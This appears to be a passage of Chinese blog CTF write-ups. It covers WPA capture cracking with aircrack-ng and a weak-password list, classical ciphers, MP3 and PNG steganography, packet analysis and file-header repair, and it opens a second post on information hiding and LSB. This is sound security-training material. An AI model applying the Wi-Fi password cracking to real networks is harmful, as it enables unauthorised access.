<p>从题目中可以看出应该答案就藏在数据包中，并且是A记录的第一条，点击链接之后下载了这个cap包</p>
<p>首先使用的我的kali下面的工具进行一下测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng shipin.cap</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8B%E5%8D%884.36.01.png" alt="屏幕快照 2017-09-20 下午4.36.01.png" title="" class="">
                <p>屏幕快照 2017-09-20 下午4.36.01.png</p>
            </figure>
<p>可见这里是wpa加密，并且bssid：00:1D:0F:5D:D0:EE，essid：0719,然后使用一个弱口令字典直接爆破，得到我们需要的密码部分：88888888（嗯，很吉利）</p>
<p>接下来就是使用工具解密报文了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8B%E5%8D%884.40.29.png" alt="屏幕快照 2017-09-20 下午4.40.29.png" title="" class="">
                <p>屏幕快照 2017-09-20 下午4.40.29.png</p>
            </figure>
<p>在目录下面生成了一个解密的报文，用wireshark打开时候直接搜索DNS，第一条A记录即为我们所需</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8B%E5%8D%884.41.09.png" alt="屏幕快照 2017-09-20 下午4.41.09.png" title="" class="">
                <p>屏幕快照 2017-09-20 下午4.41.09.png</p>
            </figure>
<h2 id="0X08-紧急报文"><a href="#0X08-紧急报文" class="headerlink" title="0X08-紧急报文"></a>0X08-紧急报文</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8B%E5%8D%887.35.45.png" alt="屏幕快照 2017-09-20 下午7.35.45.png" title="" class="">
                <p>屏幕快照 2017-09-20 下午7.35.45.png</p>
            </figure>
<p>从 题目的FA XX DD AG FF XG FD XG DD DG GA XF FA 的两个大写字母 看出这是ADFGVX加密方式，这是德军在第一次世界大战中使用的栏块密码，简单来说就是直接看表：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8B%E5%8D%887.37.40.png" alt="屏幕快照 2017-09-20 下午7.37.40.png" title="" class="">
                <p>屏幕快照 2017-09-20 下午7.37.40.png</p>
            </figure>
<p>那么FA XX DD AG FF XG FD XG DD DG GA XF FA</p>
<p>翻译过来就是flagxidianctf  -&gt; flag_Xd{hSh_ctf:flagxidianctf}</p>
<h2 id="0X09-Canon"><a href="#0X09-Canon" class="headerlink" title="0X09-Canon"></a>0X09-Canon</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8B%E5%8D%888.03.32.png" alt="屏幕快照 2017-09-20 下午8.03.32.png" title="" class="">
                <p>屏幕快照 2017-09-20 下午8.03.32.png</p>
            </figure>
<p>这道题…用到的是音频隐写，下载的压缩包打开之后是一个加密压缩包和一个mp3文件，猜想密码应该就是在音频文件当中了。其实一开始想的Aobe Audition看看是不是又藏了什么摩斯密码之类的，发现没有，那么就试试mp3的隐写。</p>
<p>之前还没有用过这种工具 ，这里推荐一下可以是用MP3Stego，名字和那个图片隐写工具stegsolve长的非常的相似，接下来就开始解密了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">decode -X -p Canon music.mp3</div></pre></td></tr></table></figure>
<p>解密之后拿到密码，解开压缩包之后有个叫走pic_png.txt文件，打开之后似乎是base64编码的，转换成图片之后显示损坏，绝逼是又把PNG头给偷走了，写个脚本加上去：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf8 -*-</span></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addHead</span><span class="params">()</span>:</span></div><div class="line">	f=open(<span class="string">'pic_png.txt'</span>).read()</div><div class="line">	fsave=open(<span class="string">'pic.png'</span>,<span class="string">'wb'</span>)</div><div class="line">	<span class="comment">#添加的png头部</span></div><div class="line">	addHeader=<span class="string">"89 50 4E 47 0D 0A 1A 0A"</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).decode(<span class="string">'hex'</span>)</div><div class="line">	fsave.write(addHeader)</div><div class="line">	fsave.write(base64.b64decode(f))</div><div class="line">	fsave.close()</div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	addHead()</div><div class="line">	<span class="keyword">print</span> <span class="string">'ok'</span></div><div class="line">	<span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>然后拿到了flag值：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8B%E5%8D%888.13.43.png" alt="屏幕快照 2017-09-20 下午8.13.43.png" title="" class="">
                <p>屏幕快照 2017-09-20 下午8.13.43.png</p>
            </figure></p>
<h2 id="0X0A-SOS"><a href="#0X0A-SOS" class="headerlink" title="0X0A-SOS"></a>0X0A-SOS</h2><p>首先这种所谓的外太空的文件，用linux来判断就好，用file命令，会得到linux rev 1.0 ext2 filesystem data，这里可以用mount命令来挂载该文件，就会看到里面那些文件了。</p>
<p>而我用得比较熟悉还是binwalk，直接binwalk -e sos即可把sos解开，打开_sos.extracted文件夹，发现有编号为1到242的小文件，而且文件大小都是1字节，然后随便抽几个去查看内容，发现是可视字符，于是就好办了。</p>
<p>用下面那个py程序，读取242个文件的内容，组合到一起就是一段话，flag就在其中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf8 -*-</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">	path=<span class="string">r".\_sos.extracted\%d"</span></div><div class="line">	s=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">242</span>+<span class="number">1</span>):</div><div class="line">		f=open(path % i).read()</div><div class="line">		s+=f</div><div class="line">	<span class="keyword">print</span> s</div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	foo()</div><div class="line">	<span class="keyword">print</span> <span class="string">'ok'</span></div></pre></td></tr></table></figure>
<p>⚠️友情提示：python的版本需在2.7.9及以下</p>
<h2 id="0X0B-黑客攻击数据包"><a href="#0X0B-黑客攻击数据包" class="headerlink" title="0X0B-黑客攻击数据包"></a>0X0B-黑客攻击数据包</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8A%E5%8D%8812.20.31.png" alt="屏幕快照 2017-10-27 上午12.20.31.png" title="" class="">
                <p>屏幕快照 2017-10-27 上午12.20.31.png</p>
            </figure>
<p>首先拿到了一个压缩包，解压缩之后有一个数据包文件，这个时候就需要考察一下我们对于wireshark的使用了，首先使用过滤语法过滤掉其中大量的tcp三次握手包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http and ip.addr == 192.168.30.170 and tcp.port == 80</div></pre></td></tr></table></figure>
<p>然后搜索Administrator，找到http包，里面有一个表单，再base64_decode一波就拿到答案了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8A%E5%8D%8812.22.59.png" alt="屏幕快照 2017-10-27 上午12.22.59.png" title="" class="">
                <p>屏幕快照 2017-10-27 上午12.22.59.png</p>
            </figure>
<p>并不知道为社么这道题目算在难里面，如果把题干读清楚了其实不算难。</p>
<h2 id="0X0C-可启动磁盘镜像"><a href="#0X0C-可启动磁盘镜像" class="headerlink" title="0X0C-可启动磁盘镜像"></a>0X0C-可启动磁盘镜像</h2><p>下载下来这个磁盘镜像之后发现无法挂载，使用strings查看之后发现flag也是不可见的，说明这个文件头应该是存在问题的，于是我使用了HexFriend打开了这个磁盘镜像，然后对照着<a href="http://www.doc88.com/p-9783379297030.html" target="_blank" rel="external">DOS的引导扇区</a>详解修复扇区：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8A%E5%8D%8812.23.03.png" alt="屏幕快照 2017-10-29 上午12.23.03.png" title="" class="">
                <p>屏幕快照 2017-10-29 上午12.23.03.png</p>
            </figure>
<p>修复好引导扇区之后终于可以正常的打开了，从里面我们可以找到一个flag文件，拖到HexFriend中发现是一张png图片，但是却少了文件头部，补上之后正满心欢喜的准备提交flag，却发现flag并不在途中，接下来开始一顿分析；</p>
<ol>
<li>这并不是JPEG图片，所以stegdetect工具也无需使用，那么就先检查LSB算法，无果</li>
<li>使用binwalk进行扫描，foremost.dd等分别提取，依然无果</li>
<li>这下还真难住了，经过百度之后发现隐写术中还有一种手段是通过16进制编辑工具更改图片的高度，只会显示图片的一部分，下面的部分就会被隐藏，是个藏东西的好办法，那么我们就开始着手去复原吧！</li>
</ol>
<p>首先我们需要去了解png图片的格式，再去讲解如何去复原图片：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8A%E5%8D%8812.29.30.png" alt="屏幕快照 2017-10-29 上午12.29.30.png" title="" class="">
                <p>屏幕快照 2017-10-29 上午12.29.30.png</p>
            </figure>
<blockquote>
<p>前八个字节<strong>89 50 4E 47 0D 0A 1A 0A</strong>为png的文件头(文件署名域)，<strong>该段格式是固定的</strong></p>
</blockquote>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8A%E5%8D%8812.30.22.png" alt="屏幕快照 2017-10-29 上午12.30.22.png" title="" class="">
                <p>屏幕快照 2017-10-29 上午12.30.22.png</p>
            </figure>
<blockquote>
<p>上图中高亮部分称为<strong>为chunk[0]段</strong>，可以分为以下几块：</p>
</blockquote>
<ul>
<li>前四个字节<strong>00 00 00 0D</strong>（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，<strong>该段格式是固定的</strong></li>
<li>之后的四个字节<strong>49 48 44 52</strong>（即为ASCII码的IHDR）是文件头数据块的标示，<strong>该段格式也是固定的</strong></li>
<li>之后进入13位数据块，前8个字节<strong>00 00 05 56 00 00 03 00</strong>中：<ul>
<li>前四个字节<strong>00 00 05 56</strong>（即为十进制的1366），代表该图片的宽，<strong>该段数据是由图片的实际宽决定的</strong></li>
<li>后四个字节<strong>00 00 03 00</strong>（即为十进制的768），代表该图片的高，<strong>该段数据是由图片的实际高度决定的</strong></li>
</ul>
</li>
<li>剩余的4位<strong>40 5C AB 95</strong>为该png的CRC检验码，也就是本篇文章要重点讨论的地方，<strong>该段数据是由IDCH以及十三位数据块（即上文中的49 48 44 52 00 00 05 56 00 00 03 00 08 02 00 00 00）计算得到的</strong>，可以参考下图：</li>
</ul>
<table>
<thead>
<tr>
<th>域的名称</th>
<th>字节数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Width</td>
<td>4 bytes</td>
<td>图像宽度，以像素为单位</td>
</tr>
<tr>
<td>Height</td>
<td>4 bytes</td>
<td>图像高度，以像素为单位</td>
</tr>
<tr>
<td>Bit depth</td>
<td>1 byte</td>
<td>图像深度：索引彩色图像：1，2，4或8灰度图像：1，2，4，8或16真彩色图像：8或16</td>
</tr>
<tr>
<td>ColorType</td>
<td>1 byte</td>
<td>颜色类型：0：灰度图像, 1，2，4，8或162：真彩色图像，8或163：索引彩色图像，1，2，4或84：带α通道数据的灰度图像，8或166：带α通道数据的真彩色图像，8或16</td>
</tr>
<tr>
<td>Compression method</td>
<td>1 byte</td>
<td>压缩方法(LZ77派生算法)</td>
</tr>
<tr>
<td>Filter method</td>
<td>1 byte</td>
<td>滤波器方法</td>
</tr>
<tr>
<td>Interlace method</td>
<td>1 byte</td>
<td>隔行扫描方法：0：非隔行扫描1： Adam7(由Adam M. Costello开发的7 遍隔行扫描方法)</td>
</tr>
</tbody>
</table>
<p>拥有了上述知识之后我们就开始着手复原，我们选择将图片的高度增大，然后发现图片就挂了，打不开了，没错，就是打不来了。这个时候其实我就在想，这种情况才是正常的，因为CRC检验码会根据前面的高度做计算，单纯的去改变高度显然是无法通过CRC校验的，但是我又找不到这个校验码生成的算法，难道就要这样胎死腹中？？</p>
<p>显然这是可能的，结合了一下以前的一些问题是因为平台问题产生的，于是我再次搜寻了一下CRC校验对于Mac/Linux的影响，然后在一篇博客中发现了这样的话：</p>
<blockquote>
<p><strong>对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。</strong></p>
<p><strong>而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况</strong></p>
</blockquote>
<p>那么既然Mac是派生自free BSD，那么应该也是和linux拥有相同的特性，于是在虚拟机中一看，果然显示出来了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8A%E5%8D%8812.38.26.png" alt="屏幕快照 2017-10-29 上午12.38.26.png" title="" class="">
                <p>屏幕快照 2017-10-29 上午12.38.26.png</p>
            </figure>
<p>同时我们联想到如果一个图片无法正常的显示，如果不是在windows系统上，除了有可能是缺失文件头，还可能是因为crc校验错误。这个时候我们就需要去通过crc码去爆破出修改前的宽和高去修复图片了，这里丢一个脚本(爆破高度)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"><span class="comment">#\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xA4\x08\x06\x00\x00\x00</span></div><div class="line"></div><div class="line">crc32key = <span class="number">0xCBD6DF8A</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">65535</span>):</div><div class="line">  height = struct.pack(<span class="string">'&gt;i'</span>, i)</div><div class="line">  <span class="comment">#CRC: CBD6DF8A</span></div><div class="line">  data = <span class="string">'\x49\x48\x44\x52\x00\x00\x01\xF4'</span> + height + <span class="string">'\x08\x06\x00\x00\x00'</span></div><div class="line"></div><div class="line">  crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> crc32result == crc32key:</div><div class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(map(<span class="keyword">lambda</span> c: <span class="string">"%02X"</span> % ord(c), height))</div></pre></td></tr></table></figure>
<p>不过其实利用windows的特性是最快的方法，但是在有的条件下就只能使用脚本爆破了。</p>
<h2 id="0X0D-异性相吸"><a href="#0X0D-异性相吸" class="headerlink" title="0X0D-异性相吸"></a>0X0D-异性相吸</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-30%20%E4%B8%8B%E5%8D%8812.33.44.png" alt="屏幕快照 2017-10-30 下午12.33.44.png" title="" class="">
                <p>屏幕快照 2017-10-30 下午12.33.44.png</p>
            </figure>
<p>下载压缩包之后解压出来两个txt文件，一个是明文.txt，一个是密文.txt，根据题目中的提示，这两个文件之间一定有着某种关系，异性相吸，那么应该是对两个文件做一次异或：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-30%20%E4%B8%8B%E5%8D%8812.48.40.png" alt="屏幕快照 2017-10-30 下午12.48.40.png" title="" class="">
                <p>屏幕快照 2017-10-30 下午12.48.40.png</p>
            </figure>
<p>如果只是对付这道题，直接写一个脚本更加简单：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># !usr/bin/env python</span></div><div class="line"><span class="comment">#  _*_ coding:utf-8 _*_</span></div><div class="line"></div><div class="line">a = open(<span class="string">'input1.txt'</span>,<span class="string">'rb'</span>).read()</div><div class="line">b = open(<span class="string">'input2.txt'</span>,<span class="string">'rb'</span>).read()</div><div class="line">oxstr =<span class="string">''</span> </div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a)):</div><div class="line">	res = ord(list(a)[i]) ^ ord(list(b)[i])</div><div class="line">	oxstr += chr(res)</div><div class="line"><span class="keyword">print</span> oxstr</div></pre></td></tr></table></figure>
<h2 id="0x0E-雌黄出其唇吻"><a href="#0x0E-雌黄出其唇吻" class="headerlink" title="0x0E-雌黄出其唇吻"></a>0x0E-雌黄出其唇吻</h2><p>这道题进去之后是一长串随机的字符串，并且刷新之后就改变了，首先看看源代码，似乎没有什么问题。题目中的提示是：怎么好像就是在随机产生？莫非不是这个？</p>
<p>那么我们可以查看一下其他的文件，看看有没有别的目录下文件之类的，可以首先试试robots.txt</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-30%20%E4%B8%8B%E5%8D%882.05.55.png" alt="屏幕快照 2017-10-30 下午2.05.55.png" title="" class="">
                <p>屏幕快照 2017-10-30 下午2.05.55.png</p>
            </figure>
<p>这里列举了一堆目录不允许爬取，尝试访问之后发现也都是失败的，结果一下滑看到了一个xml:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-30%20%E4%B8%8B%E5%8D%882.07.06.png" alt="屏幕快照 2017-10-30 下午2.07.06.png" title="" class="">
                <p>屏幕快照 2017-10-30 下午2.07.06.png</p>
            </figure>
<p>访问之后其中有一个包含着flag的php文件，直接链接过去发现是base64编码的，解码之后成功拿到flag.</p>
<h2 id="0x0F-Paint-amp-Scan"><a href="#0x0F-Paint-amp-Scan" class="headerlink" title="0x0F-Paint&amp;Scan"></a>0x0F-Paint&amp;Scan</h2><p>直接下载了一个压缩包打开时txt文件，其中都是坐标的信息，结合题目的名字应该是需要根据这些点画出一个二维码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval <span class="keyword">as</span> make_tuple</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</div><div class="line"></div><div class="line">f = open(<span class="string">'p&amp;s.txt'</span>, <span class="string">'r'</span>)</div><div class="line">points = [make_tuple(line) <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</div><div class="line">f.close()</div><div class="line"></div><div class="line">image = Image.new(<span class="string">'RGB'</span>, (<span class="number">270</span>, <span class="number">270</span>), <span class="string">'#ffffff'</span>)</div><div class="line">draw = ImageDraw.Draw(image)</div><div class="line"></div><div class="line"><span class="keyword">for</span> point <span class="keyword">in</span> points:</div><div class="line">	draw.point(point, fill=<span class="string">"#000000"</span>)</div><div class="line"></div><div class="line">image.save(<span class="string">'qrcode.png'</span>)</div></pre></td></tr></table></figure>
<p>打开生成的二维码图片之后扫描就可以获得flag值了。</p>
]]></content>
      
        <categories>
            
            <category> 密码学 编码 工具使用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-信息隐藏技术]]></title>
      <url>/2017/09/17/CTF-%E9%9A%90%E5%86%99%E6%9C%AF/</url>
      <content type="html"><![CDATA[<p>表面平平无奇的载体深处隐藏着的是打开另一个世界的钥匙（要入此门，必通古博今）</p>
<a id="more"></a>
<h1 id="信息隐藏概述"><a href="#信息隐藏概述" class="headerlink" title="信息隐藏概述"></a>信息隐藏概述</h1><ol>
<li>什么是信息隐藏技术</li>
</ol>
<p>隐写术也可以称作信息隐藏或者信息伪装技术，它利用了人类感觉器官对于数字信号的感觉冗余，将一个消息隐藏在另一个消息中，实现隐蔽通信或者隐蔽标识。</p>
<p>信息隐藏技术隐藏了秘密信息的存在（与传统密码技术有明显的区别），表面上看起来和其他地方没有什么两样，比较容易跳过攻击者的攻击。</p>
<ol>
<li>加密技术和信息隐藏技术的比较</li>
</ol>
<p>经典的以密码学为基础的加密技术，是过去主要的信息安全手段。但是传统的加密技术存在着这样一种问题：保护秘密信息时容易遭受攻击（破译），因此传统的加密技术只能满足有限的需求。</p>
<p>信息隐藏作为近些年来信息安全和多媒体领域中提出的一种解决媒体信息安全的新方法。它通过把秘密信息永久的隐藏在可公开的媒体信息中，达到<code>证实该媒体信息的所有权归属和数据的完整性</code>或<code>传递秘密信息</code>的目的   </p>
<ol>
<li>信息隐藏技术的原理和应用</li>
</ol>
<p>下面是一张信息隐藏技术的原理图：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-24%20%E4%B8%8B%E5%8D%884.15.35.png" alt="屏幕快照 2017-10-24 下午4.15.35.png" title="" class="">
                <p>屏幕快照 2017-10-24 下午4.15.35.png</p>
            </figure>
<p>由上图可知，在密钥的控制下，通过嵌入算法将秘密信息隐藏在公开信息中，掩蔽宿主则通过通信信道进行传递，接收方的检测器利用密钥从掩蔽宿主中再恢复秘密信息。</p>
<p>信息隐藏技术的特点有五点：</p>
<ol>
<li>自恢复性</li>
<li>鲁棒性</li>
<li>安全性</li>
<li>不可检测性</li>
<li>透明性</li>
</ol>
<p>上述这些特点，会随着信息隐藏目的和应用而有着不同的侧重，接下来要说的是信息隐藏技术中的一部分—隐写术</p>
<p>隐写术可以使用图片作为载体，这也是常用的隐写方式，还有一些隐写的方式是通过word或者pdf的方式进行隐藏、还有HTML问津啊、windows的交换数据流甚至还有VMware的镜像中。</p>
<h2 id="0x00-女神"><a href="#0x00-女神" class="headerlink" title="0x00-女神"></a>0x00-女神</h2><p>现在有一张图片，如果从其中找到隐藏的信息呢？<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8A%E5%8D%8810.50.08.png" alt="屏幕快照 2017-09-17 上午10.50.08.png" title="" class="">
                <p>屏幕快照 2017-09-17 上午10.50.08.png</p>
            </figure></p>
<p>首先我们可以使用notepad++来打开这个图像，然后我们意外的发现：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8A%E5%8D%8810.51.00.png" alt="屏幕快照 2017-09-17 上午10.51.00.png" title="" class="">
                <p>屏幕快照 2017-09-17 上午10.51.00.png</p>
            </figure>
<p>其中似乎包含着一个txt文件，那么想一想是不是可以将图像转换成压缩包，再解压缩就可以看到这个txt了呢</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8A%E5%8D%8810.52.51.png" alt="屏幕快照 2017-09-17 上午10.52.51.png" title="" class="">
                <p>屏幕快照 2017-09-17 上午10.52.51.png</p>
            </figure>想到就去做，果然不出我们所料，找到了这个隐藏信息<br><br>找到了隐藏的信息之后，我们发现这是一个md5加密的信息，再进行反向解密即可。<br><br>更简单的方式就是先使用binwalk进行一次图片的分析：binwalk是kali自带的图片分析和提取工具：<br><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8B%E5%8D%884.52.54.png" alt="屏幕快照 2017-09-17 下午4.52.54.png" title="" class="">
                <p>屏幕快照 2017-09-17 下午4.52.54.png</p>
            </figure>
<p>显然图片中隐藏着一个压缩包，<code>binwalk -e sim.jpg</code>是提取其中的压缩包，也可以使用foremost来提取。</p>
<h2 id="0x01-愤怒的小鸟"><a href="#0x01-愤怒的小鸟" class="headerlink" title="0x01-愤怒的小鸟"></a>0x01-愤怒的小鸟</h2><h4 id="LSB介绍"><a href="#LSB介绍" class="headerlink" title="LSB介绍"></a>LSB介绍</h4><p>这里我们会需要用到的知识是信息隐藏算法之LSB算法,LSB算法也就是最低有效位</p>
<p>在讲算法之前，我们先了解两个概念：<br>1.bmp图片是无损图片，每个像素点都用三个0-255的值来表示red，green，blue。<br>（注意：bmp图片的前14比特是头信息，最好不要用于该算法）。<br>而JPG图片是经过了DCT变换的，不能使用该算法。</p>
<p>2.这里为了算法简单起见，我们使用灰度图像：每个像素点用0-255的值来表示黑白颜色深度。</p>
<p>3.二值图像：每个像素点用0代表黑色，1代表白色<br>现在有一张宿主图片，我们要在宿主图片里面嵌入要隐藏的图片（当然可以是其它字符串），算法的思想是这样的：<br>1.将宿主图像变成灰度图像，将要隐藏的图像变成二值图像。<br>2.利用Matlab的bitget和bitset函数获得宿主图像中每个像素点的最低比特位（每个像素点总共有8位，2^8 = 256）将最低比特位与二值图像的位进行异或。如果结果为0，则不变；如果结果为1,如果设置宿主图像的最低比特位为1，则变成0；最低比特位是0，则变成1。<br>⚠️：这里必须保证宿主图片的大小必须大于要隐藏图片的大小。<br>3.因为改变最低比特位对0-255的像素点来说只改变 +1 或 -1的大小，对于整个像素点的变化几乎很小看不到。所以可以用该算法来做信息隐藏。</p>
<h4 id="开始实战"><a href="#开始实战" class="headerlink" title="开始实战"></a>开始实战</h4><p>了解到这些知识之后，我们就来看一张图片吧：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8B%E5%8D%8812.07.24.png" alt="屏幕快照 2017-09-17 下午12.07.24.png" title="" class="">
                <p>屏幕快照 2017-09-17 下午12.07.24.png</p>
            </figure>
<p>这张图片看起来平平无奇，就算使用notepad++打开的时候也没有发现什么关键的信息，但是我们可以继续想想，会不会有图片隐藏在这个图片中呢，我们使用工具StegSolve来打开这张图片，通过上面的箭头切换逐渐寻找其隐藏图像，终于被我们找到了！：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8B%E5%8D%8812.11.37.png" alt="屏幕快照 2017-09-17 下午12.11.37.png" title="" class="">
                <p>屏幕快照 2017-09-17 下午12.11.37.png</p>
            </figure>
<h2 id="0x03-缺失的文件头"><a href="#0x03-缺失的文件头" class="headerlink" title="0x03-缺失的文件头"></a>0x03-缺失的文件头</h2><p>当我们下载了一个图片，但是无法打开的时候，这个时候该怎么办呢？看起来就是黑呼呼的一团…</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8B%E5%8D%881.03.27.png" alt="屏幕快照 2017-09-17 下午1.03.27.png" title="" class="">
